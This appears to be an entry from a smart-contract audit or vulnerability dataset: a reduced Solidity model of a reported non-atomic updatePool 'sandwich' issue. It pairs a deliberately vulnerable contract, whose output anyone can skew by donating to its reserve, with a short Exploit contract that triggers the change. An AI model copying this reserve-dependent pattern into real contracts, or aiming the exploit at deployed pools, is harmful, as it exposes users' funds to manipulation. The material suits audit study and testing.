// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 62757: Yuzu non-atomic updatePool sandwich. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public reserve = 100; function donate(uint256 amount) external { reserve += amount; } function updatePool() external view returns (uint256) { return 1000 / reserve; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.donate(100); success = bug.updatePool() == 5;
    }
}


